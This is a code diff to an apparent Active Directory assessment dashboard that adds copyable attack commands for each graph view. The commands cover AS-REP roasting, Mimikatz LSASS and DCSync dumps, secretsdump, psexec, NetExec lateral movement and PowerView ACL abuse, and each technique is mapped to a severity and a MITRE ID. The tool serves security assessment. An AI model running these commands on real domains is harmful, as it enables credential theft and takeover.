+                tool: 'Impacket (GetNPUsers) & Rubeus',
+                desc: 'Harvesting AS-REP hashes for users that do not require Kerberos pre-authentication.',
+                commands: [
+                    { label: 'Impacket GetNPUsers (Request Hashes)', cmd: 'GetNPUsers.py -request -no-pass -dc-ip 10.10.10.10 MANTAINSIGHT.LOCAL/ -usersfile users.txt' },
+                    { label: 'Rubeus (Harvest & Dump Hashes)', cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt' },
+                    { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 18200 hashes.txt passwords.txt' }
+                ]
+            },
+            'unconstrained_delegation': {
+                tool: 'Rubeus & Printer Bug Coercion',
+                desc: 'Tricking a high-privilege account/DC to authenticate to a server configured with Unconstrained Delegation to dump tickets.',
+                commands: [
+                    { label: 'Rubeus (Monitor & Capture Tickets)', cmd: 'Rubeus.exe monitor /interval:5' },
+                    { label: 'SpoolerTrigger (Coerce DC Authentication)', cmd: 'MS-RPRN.py 10.10.10.10 10.10.10.12 -u username -p password' },
+                    { label: 'Rubeus (Inject Captured Ticket)', cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi' }
+                ]
+            },
+            'shortest_path': {
+                tool: 'BloodHound, Mimikatz & Secretsdump',
+                desc: 'Finding shortest path to Domain Admin, executing credential dumping to escalate privileges.',
+                commands: [
+                    { label: 'Impacket Secretsdump (Extract Hashes)', cmd: 'secretsdump.py MANTAINSIGHT.LOCAL/username:password@10.10.10.10' },
+                    { label: 'Mimikatz (Dump LSASS Secrets)', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }
+                ]
+            },
+            'shortest_path_to_hvt': {
+                tool: 'BloodHound & Mimikatz',
+                desc: 'Finding shortest path to High Value Targets inside the Active Directory database.',
+                commands: [
+                    { label: 'Mimikatz (Extract Hashes from LSASS)', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }
+                ]
+            },
+            'shortest_path_users_to_hvt': {
+                tool: 'BloodHound & Secretsdump',
+                desc: 'Mapping delegation and privilege paths from typical Domain Users to High Value Targets.',
+                commands: [
+                    { label: 'Impacket Secretsdump (Dump Local SAM/LSA Secrets)', cmd: 'secretsdump.py MANTAINSIGHT.LOCAL/username:password@10.10.10.10' }
+                ]
+            },
+            'all_paths_users_to_hvt': {
+                tool: 'BloodHound Grapher',
+                desc: 'Mapping all security group delegation linkages connecting Domain Users to HVT nodes.',
+                commands: [
+                    { label: 'BloodHound Sharphound (Collect AD Data)', cmd: 'SharpHound.exe -c All' }
+                ]
+            },
+            'shortest_path_to_da_from_owned': {
+                tool: 'Impacket (psexec) / NetExec',
+                desc: 'Abusing compromised accounts to perform administrative pivots to Domain Admins.',
+                commands: [
+                    { label: 'Impacket PsExec (Establish Shell)', cmd: 'psexec.py MANTAINSIGHT.LOCAL/username:password@10.10.10.10' }
+                ]
+            },
+            'shortest_path_from_owned': {
+                tool: 'Impacket Suite',
+                desc: 'Determining exploitation avenues beginning from active compromised identities.',
+                commands: [
+                    { label: 'NetExec SMB Lateral Pivot', cmd: 'nxc smb 10.10.10.0/24 -u username -p password --local-auth' }
+                ]
+            },
+            'most_admins': {
+                tool: 'NetExec / CrackMapExec',
+                desc: 'Leveraging local administrator privileges across target hosts to achieve lateral movement.',
+                commands: [
+                    { label: 'NetExec (Validate Local Admin Rights)', cmd: 'nxc smb 10.10.10.0/24 -u username -p password --local-auth' },
+                    { label: 'NetExec (Execute Command via WMI)', cmd: 'nxc smb 10.10.10.15 -u username -p password -x "whoami"' }
+                ]
+            },
+            'da_logons_non_dc': {
+                tool: 'Mimikatz & LSASS Dump',
+                desc: 'Dumping credentials of active high-privilege sessions (Domain Admins) active on workstations.',
+                commands: [
+                    { label: 'LSASS Dump via Procdump', cmd: 'procdump.exe -ma lsass.exe lsass.dmp' },
+                    { label: 'Mimikatz (Extract Hashes from Dump)', cmd: 'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit' }
+                ]
+            },
+            'dangerous_domain_users': {
+                tool: 'PowerView (PowerSploit)',
+                desc: 'Abusing dangerous write permissions or ACL configuration delegates.',
+                commands: [
+                    { label: 'PowerView (Add Member to Sensitive Group)', cmd: 'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "Domain Users" -Rights GenericAll' },
+                    { label: 'PowerView (Force Password Change)', cmd: 'Set-DomainUserPassword -Identity administrator -NewPassword "P@ssw0rd123!"' }
+                ]
+            },
+            'all_domain_admins': {
+                tool: 'PowerView / Net User',
+                desc: 'Querying and listing all privileged group memberships within Domain Admins.',
+                commands: [
+                    { label: 'Get Domain Admin Members (CMD)', cmd: 'net group "Domain Admins" /domain' },
+                    { label: 'Get Domain Admin Members (PowerShell)', cmd: 'Get-ADGroupMember -Identity "Domain Admins"' }
+                ]
+            },
+            'dcsync_rights': {
+                tool: 'Mimikatz (dcsync)',
+                desc: 'Performing Domain Replication synchronization requests to dump Active Directory password hashes.',
+                commands: [
+                    { label: 'Mimikatz (DCSync Krbtgt Hash)', cmd: 'mimikatz.exe "lsadump::dcsync /domain:MANTAINSIGHT.LOCAL /user:krbtgt" exit' },
+                    { label: 'Mimikatz (DCSync All Users)', cmd: 'mimikatz.exe "lsadump::dcsync /domain:MANTAINSIGHT.LOCAL /all" exit' }
+                ]
+            },
+            'domain_trusts': {
+                tool: 'PowerView / nltest',
+                desc: 'Discovering external trust connections and trust direction schemas across domains.',
+                commands: [
+                    { label: 'Get Domain Trusts (nltest)', cmd: 'nltest /domain_trusts' },
+                    { label: 'Get Domain Trusts (PowerShell)', cmd: 'Get-ADTrust -Filter *' }
+                ]
+            },
+            'foreign_users': {
+                tool: 'PowerView',
+                desc: 'Finding nested users originating from trusted external forest directories.',
+                commands: [
+                    { label: 'Get Foreign Users (PowerShell)', cmd: 'Get-DomainUser -Foreign' }
+                ]
+            },
+            'foreign_groups': {
+                tool: 'PowerView',
+                desc: 'Finding nested security groups originating from trusted external forest directories.',
+                commands: [
+                    { label: 'Get Foreign Groups (PowerShell)', cmd: 'Get-DomainGroup -Foreign' }
+                ]
+            },
+            'domain_users_local_admin': {
+                tool: 'NetExec / PowerView',
+                desc: 'Finding local administrator permissions assigned directly to Domain Users group.',
+                commands: [
+                    { label: 'NetExec (Scan local admin rights)', cmd: 'nxc smb 10.10.10.0/24 -u username -p password' }
+                ]
+            },
+            'domain_users_read_laps': {
+                tool: 'LAPS Toolkit / PowerView',
+                desc: 'Querying access control entries allowing typical domain accounts to read computer local admin password attributes.',
+                commands: [
+                    { label: 'Read LAPS Attribute (PowerShell)', cmd: 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "ReadProperty" -and $_.SecurityIdentifier -match "S-1-5-21-" }' }
+                ]
+            },
+            'workstations_rdp': {
+                tool: 'NetExec / PowerView',
+                desc: 'Scanning and listing workstations accessible via Remote Desktop Protocol (RDP).',
+                commands: [
+                    { label: 'NetExec (RDP scan)', cmd: 'nxc rdp 10.10.10.0/24' }
+                ]
+            },
+            'servers_rdp': {
+                tool: 'NetExec',
+                desc: 'Scanning and listing server resources accessible via Remote Desktop Protocol (RDP).',
+                commands: [
+                    { label: 'NetExec (RDP scan)', cmd: 'nxc rdp 10.10.10.0/24' }
+                ]
+            },
+            'unsupported_os': {
+                tool: 'Nmap OS Detection',
+                desc: 'Scanning networks to locate computer targets executing end-of-life operating systems.',
+                commands: [
+                    { label: 'Nmap (OS Detection)', cmd: 'nmap -O 10.10.10.0/24' }
+                ]
+            }
+        };
+
+        const data = commandData[viewType];
+        if (!data) {
+            bar.style.display = 'none';
+            return;
+        }
+
+        bar.style.display = 'flex';
+        content.innerHTML = `
+            <div style="font-size:11.5px; color:var(--text-secondary); line-height:1.4; margin-bottom:4px;">
+                <strong>Method:</strong> ${data.desc} <br/>
+                <strong>Active Tools:</strong> <span style="color:var(--accent-indigo); font-weight:600;">${data.tool}</span>
+            </div>
+            <div style="display:flex; flex-direction:column; gap:8px;">
+                ${data.commands.map(item => `
+                    <div style="background:rgba(30, 41, 59, 0.4); border:1px solid rgba(239, 68, 68, 0.15); border-radius:4px; padding:10px;">
+                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                            <span style="font-size:10px; color:var(--text-primary); font-weight:700;"><i class="fa-solid fa-chevron-right" style="font-size:8px; margin-right:4px; color:var(--color-high);"></i>${item.label}</span>
+                            <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\`${item.cmd.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`); showToast('Copied!', 'success');" style="padding:1px 4px; font-size:9px; height:auto; cursor:pointer; background:rgba(255,255,255,0.05); border:1px solid var(--border-color); color:var(--text-secondary);">Copy</button>
+                        </div>
+                        <pre style="margin:0; font-family:monospace; font-size:11px; color:#f87171; overflow-x:auto; white-space:pre-wrap; word-break:break-all;">${item.cmd}</pre>
+                    </div>
+                `).join('')}
+            </div>
+        `;
+    }
 
     function drawNetwork(viewType) {
         try {
+            updateAttackCommandsUI(viewType);
             const container = document.getElementById('ad-graph-canvas');
             const cypherCode = document.getElementById('bh-cypher-code');
             if (!container) return;
@@ -6465,6 +8091,166 @@ document.addEventListener('DOMContentLoaded', () => {
             }
 
             if (cypherCode) cypherCode.textContent = cypherText;
+
+            // Populate List View
+            const listTbody = document.getElementById('bh-list-tbody');
+
+            // ── Attack Path metadata per viewType ──────────────────────────────
+            const attackPathMeta = {
+                'all_domain_admins':                   { technique: 'Domain Admin Enumeration',           severity: 'High',     tool: 'PowerView / net group',          mitre: 'T1069.002' },
+                'shortest_path':                       { technique: 'Shortest Path to DA',                severity: 'Critical', tool: 'BloodHound + Mimikatz',          mitre: 'T1078.002' },
+                'dcsync_rights':                       { technique: 'DCSync (AD Replication Abuse)',       severity: 'Critical', tool: 'Mimikatz lsadump::dcsync',        mitre: 'T1003.006' },
+                'foreign_users':                       { technique: 'Foreign User Exploitation',           severity: 'Medium',   tool: 'PowerView Get-DomainUser',        mitre: 'T1484' },
+                'foreign_groups':                      { technique: 'Foreign Group Membership Abuse',      severity: 'Medium',   tool: 'PowerView Get-DomainGroup',       mitre: 'T1484' },
+                'domain_trusts':                       { technique: 'Domain Trust Exploitation',           severity: 'High',     tool: 'PowerView / nltest',              mitre: 'T1484.002' },
+                'shortest_path_kerberoastable':        { technique: 'Kerberoasting (Targeted)',            severity: 'High',     tool: 'Impacket GetUserSPNs',            mitre: 'T1558.003' },
+                'shortest_path_to_da_from_kerberoastable': { technique: 'Kerberoast → DA Escalation',   severity: 'Critical', tool: 'Impacket + Hashcat',              mitre: 'T1558.003' },
+                'shortest_path_from_owned':            { technique: 'Lateral Movement from Owned',        severity: 'Critical', tool: 'NetExec / Impacket',             mitre: 'T1021' },
+                'shortest_path_to_da_from_owned':      { technique: 'Privilege Escalation to DA',         severity: 'Critical', tool: 'PsExec / WMIexec',              mitre: 'T1078.002' },
+                'shortest_path_to_hvt':                { technique: 'Path to High-Value Target',          severity: 'Critical', tool: 'BloodHound + Mimikatz',          mitre: 'T1078' },
+                'domain_users_local_admin':            { technique: 'Domain Users → Local Admin',         severity: 'High',     tool: 'NetExec / PowerView',            mitre: 'T1078.003' },
+                'domain_users_read_laps':              { technique: 'LAPS Password Read',                 severity: 'High',     tool: 'LAPS Toolkit',                   mitre: 'T1552' },
+                'shortest_path_users_to_hvt':          { technique: 'Users → HVT Path',                   severity: 'High',     tool: 'BloodHound / Secretsdump',        mitre: 'T1078' },
+                'all_paths_users_to_hvt':              { technique: 'All Users → HVT Paths',              severity: 'High',     tool: 'BloodHound Grapher',              mitre: 'T1078' },
+                'workstations_rdp':                    { technique: 'RDP Lateral Movement (Workstation)',  severity: 'Medium',   tool: 'NetExec rdp / xfreerdp',         mitre: 'T1021.001' },
+                'servers_rdp':                         { technique: 'RDP Lateral Movement (Server)',      severity: 'High',     tool: 'NetExec rdp',                    mitre: 'T1021.001' },
+                'dangerous_domain_users':              { technique: 'ACL Abuse / WriteDACL',              severity: 'Critical', tool: 'PowerView PowerSploit',           mitre: 'T1222.001' },
+                'most_admins':                         { technique: 'Local Admin Privilege Abuse',        severity: 'High',     tool: 'NetExec / CrackMapExec',         mitre: 'T1078.003' },
+                'kerberoastable_hvt_members':          { technique: 'Kerberoastable HVT Member Abuse',   severity: 'Critical', tool: 'Rubeus / Hashcat',               mitre: 'T1558.003' },
+                'all_kerberoastable':                  { technique: 'Kerberoasting (All SPNs)',            severity: 'High',     tool: 'Impacket GetUserSPNs + Hashcat', mitre: 'T1558.003' },
+                'kerberoastable_most_privileges':      { technique: 'High-Privilege Kerberoasting',       severity: 'Critical', tool: 'Rubeus kerberoast',              mitre: 'T1558.003' },
+                'da_logons_non_dc':                    { technique: 'Credential Theft from Workstation',  severity: 'Critical', tool: 'Mimikatz / Procdump LSASS',       mitre: 'T1003.001' },
+                'unsupported_os':                      { technique: 'Legacy OS Exploitation',             severity: 'High',     tool: 'Nmap + Metasploit',              mitre: 'T1190' },
+                'unconstrained_delegation':            { technique: 'Unconstrained Delegation Abuse',    severity: 'Critical', tool: 'Rubeus monitor + SpoolerTrigger', mitre: 'T1558.001' },
+                'asrep_roastable':                     { technique: 'AS-REP Roasting',                    severity: 'Critical', tool: 'Impacket GetNPUsers + Hashcat',   mitre: 'T1558.004' }
+            };
+
+            const getAttackPathCell = (vType) => {
+                const meta = attackPathMeta[vType];
+                if (!meta) return `<td style="padding:10px 12px; vertical-align:middle; color:var(--text-muted); font-size:11px; font-style:italic;">—</td>`;
+                const sevColor = meta.severity === 'Critical' ? '#ef4444' : meta.severity === 'High' ? '#f97316' : meta.severity === 'Medium' ? '#f59e0b' : '#3b82f6';
+                return `
+                    <td style="padding:10px 12px; vertical-align:middle;">
+                        <div style="display:flex; flex-direction:column; gap:5px;">
+                            <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
+                                <span style="font-size:9px; font-weight:700; padding:2px 7px; border-radius:4px; background:${sevColor}18; color:${sevColor}; border:1px solid ${sevColor}40; white-space:nowrap;">${meta.severity.toUpperCase()}</span>
+                                <span style="font-weight:700; font-size:11px; color:var(--text-primary); line-height:1.2;">${meta.technique}</span>
+                            </div>
+                            <div style="display:flex; align-items:center; gap:5px;">
+                                <i class="fa-solid fa-terminal" style="color:var(--text-muted); font-size:9px;"></i>
+                                <span style="font-size:10px; color:var(--text-muted); font-family:monospace;">${meta.tool}</span>
+                            </div>
+                            <div style="display:flex; align-items:center; gap:8px;">
+                                <span style="font-size:9px; padding:1px 6px; border-radius:3px; background:rgba(99,102,241,0.12); color:#818cf8; border:1px solid rgba(99,102,241,0.25); font-family:monospace; font-weight:600;">${meta.mitre}</span>
+                                <button onclick="event.stopPropagation(); window.showAttackPathDetail('${vType}')" style="font-size:9px; padding:2px 8px; border-radius:4px; background:rgba(239,68,68,0.12); color:${sevColor}; border:1px solid ${sevColor}35; cursor:pointer; font-weight:700; display:inline-flex; align-items:center; gap:4px; transition:background 0.15s;">
+                                    <i class="fa-solid fa-bolt"></i> Exploit Steps
+                                </button>
+                            </div>
+                        </div>
+                    </td>
+                `;
+            };
+
+            if (listTbody) {
+                listTbody.innerHTML = '';
+                if (edgesData.length > 0) {
+                    edgesData.forEach((edge, idx) => {
+                        const fromNode = nodesData.find(n => n.id === edge.from);
+                        const toNode = nodesData.find(n => n.id === edge.to);
+                        const fromName = fromNode ? fromNode.label : edge.from;
+                        const fromType = fromNode ? fromNode.type : 'UNKNOWN';
+                        const toName = toNode ? toNode.label : edge.to;
+                        const toType = toNode ? toNode.type : 'UNKNOWN';
+
+                        // Styling badges
+                        const getBadgeStyle = (type) => {
+                            switch(type.toUpperCase()) {
+                                case 'USER': return 'background:rgba(37,99,235,0.15); color:#60a5fa; border:1px solid rgba(37,99,235,0.3);';
+                                case 'ADMIN': return 'background:rgba(225,29,72,0.15); color:#fda4af; border:1px solid rgba(225,29,72,0.3);';
+                                case 'COMPUTER': return 'background:rgba(217,119,6,0.15); color:#fcd34d; border:1px solid rgba(217,119,6,0.3);';
+                                case 'GROUP': return 'background:rgba(5,150,105,0.15); color:#6ee7b7; border:1px solid rgba(5,150,105,0.3);';
+                                case 'GPO': return 'background:rgba(124,58,237,0.15); color:#c084fc; border:1px solid rgba(124,58,237,0.3);';
+                                case 'DOMAIN': return 'background:rgba(8,145,178,0.15); color:#67e8f9; border:1px solid rgba(8,145,178,0.3);';
+                                default: return 'background:rgba(255,255,255,0.05); color:#e2e8f0; border:1px solid rgba(255,255,255,0.1);';
+                            }
+                        };
+
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
+                        tr.style.transition = 'background 0.2s';
+                        tr.onmouseover = () => { tr.style.background = 'rgba(255,255,255,0.02)'; };
+                        tr.onmouseout = () => { tr.style.background = 'none'; };
+
+                        tr.innerHTML = `
+                            <td style="padding:10px 12px; vertical-align:middle; text-align:center; color:var(--text-secondary);">${idx + 1}</td>
+                            <td style="padding:10px 12px; vertical-align:middle;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <span style="font-size:9px; font-weight:700; padding:2px 6px; border-radius:4px; ${getBadgeStyle(fromType)}">${fromType}</span>
+                                    <span style="font-weight:600; color:var(--text-primary);">${fromName}</span>
+                                </div>
+                            </td>
+                            <td style="padding:10px 12px; vertical-align:middle;">
+                                <div style="display:flex; flex-direction:column; gap:2px;">
+                                    <span style="font-family:monospace; font-weight:700; color:#818cf8; font-size:11px;">-[:${edge.label}]-></span>
+                                    ${edge.desc ? `<span style="font-size:10px; color:var(--text-muted); line-height:1.3;">${edge.desc}</span>` : ''}
+                                </div>
+                            </td>
+                            <td style="padding:10px 12px; vertical-align:middle;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <span style="font-size:9px; font-weight:700; padding:2px 6px; border-radius:4px; ${getBadgeStyle(toType)}">${toType}</span>
+                                    <span style="font-weight:600; color:var(--text-primary);">${toName}</span>
+                                </div>
+                            </td>
+                            ${getAttackPathCell(viewType)}
+                        `;
+                        listTbody.appendChild(tr);
+                    });
+                } else if (nodesData.length > 0) {
+                    nodesData.forEach((node, idx) => {
+                        const tr = document.createElement('tr');
+                        tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
+                        tr.style.transition = 'background 0.2s';
+                        tr.onmouseover = () => { tr.style.background = 'rgba(255,255,255,0.02)'; };
+                        tr.onmouseout = () => { tr.style.background = 'none'; };
+
+                        const getBadgeStyle = (type) => {
+                            switch(type.toUpperCase()) {
+                                case 'USER': return 'background:rgba(37,99,235,0.15); color:#60a5fa; border:1px solid rgba(37,99,235,0.3);';
+                                case 'ADMIN': return 'background:rgba(225,29,72,0.15); color:#fda4af; border:1px solid rgba(225,29,72,0.3);';
+                                case 'COMPUTER': return 'background:rgba(217,119,6,0.15); color:#fcd34d; border:1px solid rgba(217,119,6,0.3);';
+                                case 'GROUP': return 'background:rgba(5,150,105,0.15); color:#6ee7b7; border:1px solid rgba(5,150,105,0.3);';
+                                case 'GPO': return 'background:rgba(124,58,237,0.15); color:#c084fc; border:1px solid rgba(124,58,237,0.3);';
+                                case 'DOMAIN': return 'background:rgba(8,145,178,0.15); color:#67e8f9; border:1px solid rgba(8,145,178,0.3);';
+                                default: return 'background:rgba(255,255,255,0.05); color:#e2e8f0; border:1px solid rgba(255,255,255,0.1);';
+                            }
+                        };
+
+                        tr.innerHTML = `
+                            <td style="padding:10px 12px; vertical-align:middle; text-align:center; color:var(--text-secondary);">${idx + 1}</td>
+                            <td style="padding:10px 12px; vertical-align:middle;">
+                                <div style="display:flex; align-items:center; gap:8px;">
+                                    <span style="font-size:9px; font-weight:700; padding:2px 6px; border-radius:4px; ${getBadgeStyle(node.type)}">${node.type}</span>
+                                    <span style="font-weight:600; color:var(--text-primary);">${node.label}</span>
+                                </div>
+                            </td>
+                            <td style="padding:10px 12px; vertical-align:middle;">
+                                <span style="font-size:11px; color:var(--text-muted);">Node properties matched query criteria.</span>
+                            </td>
+                            <td style="padding:10px 12px; vertical-align:middle; color:var(--text-muted); font-style:italic;">
+                                N/A
+                            </td>
+                            ${getAttackPathCell(viewType)}
+                        `;
+                        listTbody.appendChild(tr);
+                    });
+                } else {
+                    listTbody.innerHTML = `
+                        <tr>
+                            <td colspan="5" style="text-align:center; padding:20px; color:var(--text-muted);">Tidak ada data untuk query ini.</td>
+                        </tr>
+                    `;
+                }
+            }
 
             const visNodes = new vis.DataSet(nodesData);
             const visEdges = new vis.DataSet(edgesData);
